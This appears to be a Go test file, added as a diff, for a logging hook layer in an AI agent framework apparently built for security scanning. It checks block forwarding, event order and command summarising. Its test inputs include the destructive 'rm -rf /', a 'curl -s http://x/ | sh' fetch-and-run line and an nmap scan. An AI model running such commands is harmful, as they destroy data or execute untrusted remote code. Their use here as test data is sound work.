@@ -1,0 +1,127 @@
+package agent
+
+import (
+	"context"
+	"encoding/json"
+	"strings"
+	"testing"
+
+	"github.com/Autumn-27/norma/llm"
+)
+
+// spyHook 记录转发给 inner 的调用，用来验证日志层是【旁路】而不是拦截层。
+type spyHook struct {
+	preCalls  int
+	postCalls int
+	stopCalls int
+	block     bool
+	msg       string
+}
+
+func (s *spyHook) PreToolUse(_ context.Context, _ string, _ []byte) (bool, string, []byte) {
+	s.preCalls++
+	return s.block, s.msg, nil
+}
+
+func (s *spyHook) PostToolUse(_ context.Context, _ string, _, _ []byte, _ bool) {
+	s.postCalls++
+}
+
+func (s *spyHook) Stop(_ context.Context, _ []llm.Message) (bool, []string, string) {
+	s.stopCalls++
+	return false, nil, ""
+}
+
+// 日志层不得吞掉 inner 的拦截决定：worker 的 steer/拦截全靠 inner 生效。
+func TestToolLogForwardsBlockDecision(t *testing.T) {
+	spy := &spyHook{block: true, msg: "被拦截"}
+	h := wrapToolLog(spy, KindWorker, "worker-1 · #1")
+	ctx := WithRunInfo(context.Background(), RunInfo{TaskID: 3, IntentID: 7, Kind: KindWorker})
+
+	block, msg, _ := h.PreToolUse(ctx, "Bash", []byte(`{"command":"rm -rf /"}`))
+	if !block {
+		t.Fatal("日志层把 inner 的 block 决定吞掉了——worker 的拦截会失效")
+	}
+	if msg != "被拦截" {
+		t.Fatalf("block 消息未透传: got %q", msg)
+	}
+	if spy.preCalls != 1 {
+		t.Fatalf("inner 未被调用: preCalls=%d", spy.preCalls)
+	}
+}
+
+// 日志层必须把三个事件都转发，且顺序为 pre→post→stop。
+func TestToolLogForwardsAllEvents(t *testing.T) {
+	spy := &spyHook{}
+	h := wrapToolLog(spy, KindPlanner, "")
+	ctx := WithRunInfo(context.Background(), RunInfo{TaskID: 9, Kind: KindPlanner})
+
+	h.PreToolUse(ctx, "Bash", []byte(`{"command":"nmap -sV 10.0.0.1"}`))
+	h.PostToolUse(ctx, "Bash", []byte(`{}`), []byte("ok"), false)
+	h.Stop(ctx, nil)
+
+	if spy.preCalls != 1 || spy.postCalls != 1 || spy.stopCalls != 1 {
+		t.Fatalf("事件未全部转发: pre=%d post=%d stop=%d", spy.preCalls, spy.postCalls, spy.stopCalls)
+	}
+}
+
+// 无 inner 时本层就是全部：必须放行而不是误拦。
+func TestToolLogWithoutInnerAllowsAll(t *testing.T) {
+	h := toolLogSink(KindMain)
+	ctx := WithRunInfo(context.Background(), RunInfo{TaskID: 1, Kind: KindMain})
+	block, msg, _ := h.PreToolUse(ctx, "Bash", []byte(`{"command":"ls"}`))
+	if block || msg != "" {
+		t.Fatalf("无 inner 时不应拦截: block=%v msg=%q", block, msg)
+	}
+}
+
+// Bash 命令摘要只取第一行并限长——多行脚本不能把 journal 撑爆。
+func TestSummarizeToolInputTrimsCommand(t *testing.T) {
+	in, _ := json.Marshal(map[string]string{
+		"command": "curl -s http://x/ | sh\n第二条命令很长很长很长很长很长",
+	})
+	got := summarizeToolInput("Bash", in)
+	if strings.Contains(got, "第二条") {
+		t.Fatalf("命令摘要应只取第一行: %q", got)
+	}
+	if len([]rune(got)) > 100 {
+		t.Fatalf("命令摘要过长: %d 字符", len([]rune(got)))
+	}
+}
+
+// 空输入不能 panic（工具入参缺失是常见情况）。
+func TestSummarizeToolInputEmpty(t *testing.T) {
+	if got := summarizeToolInput("Bash", nil); got != "" {
+		t.Fatalf("空输入应返回空串: %q", got)
+	}
+	if got := summarizeToolInput("未知工具", []byte("{}")); got != "" {
+		t.Fatalf("空 JSON 应返回空串: %q", got)
+	}
+}
+
+// 结果分类：error 优先于 blocked（WAF 措辞常常出现在错误输出里）。
+func TestClassifyToolResult(t *testing.T) {
+	if got := classifyToolResult([]byte("boom"), true); got != "error" {
+		t.Fatalf("isErr 应判 error: %q", got)
+	}
+	if got := classifyToolResult([]byte("HTTP 403 Forbidden"), false); got != "blocked" {
+		t.Fatalf("403 应判 blocked: %q", got)
+	}
+	if got := classifyToolResult([]byte("found 3 open ports"), false); got != "ok" {
+		t.Fatalf("正常输出应判 ok: %q", got)
+	}
+}
+
+// 日志前缀必须带出 agent 角色与归属 id——否则日志无法定位到具体意图。
+func TestToolLogPrefixCarriesAttribution(t *testing.T) {
+	h := toolLogSink(KindWorker)
+	ctx := WithRunInfo(context.Background(), RunInfo{
+		TaskID: 3, ExplorationID: 3, IntentID: 42, Kind: KindWorker,
+	})
+	p := h.prefix(ctx)
+	for _, want := range []string{"worker", "task=3", "exp=3", "intent=#42"} {
+		if !strings.Contains(p, want) {
+			t.Fatalf("前缀缺少 %q: %q", want, p)
+		}
+	}
+}
